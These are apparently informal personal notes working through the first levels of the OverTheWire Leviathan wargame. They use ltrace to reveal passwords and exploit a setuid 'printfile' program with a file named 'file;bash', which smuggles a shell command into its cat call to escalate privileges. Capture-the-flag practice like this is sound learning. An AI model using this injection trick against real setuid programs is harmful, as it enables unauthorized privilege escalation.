Login:
echo PASSWORD > X

sshpass -p $(cat X) ssh levaithanX@bandit.labs.overthewire.org -p 2223

lvl0

ls
./backup

did cd .backup/
got a bookmarks.html

it's a huge file
did 
grep password bookmarks.html

got thr password for lvl1

lvl1

ls got check setuid file
./check
used ltrace which shows all libaray calls
including the strcpy('entered pass','crt pass')
executed the check with crt password 
got access to leviathan2
now cat /etc/leviathan_pass/leviathan2

got the password for next level

lvl2

we got a setuid file called printfile
did 
./printfile /etc/leviathan_pass/leviathan3
says youu can't have that file 

./printfile /etc/passwd

got a lot of files

did 
ltrace ./printfile /etc/passwd
snprinntf("/bin/cat /etc/passwd" ,511,"/bin/cat %s","/etc/passwd")

got a vulnerabiltiy
made a temp folder
mktemp -d
cd to it 
touch 'file;bash'

this means that whenever we do the cat 
when we do cat file it will cat the file and encounter the ; and escalates to next level

escalated to next level shell(why? printfile was a setuid file so it have the ownership of leviathan 3)
did cat /etc/leviathan_pass/leviathan3

got the password for lvl3

lvl3
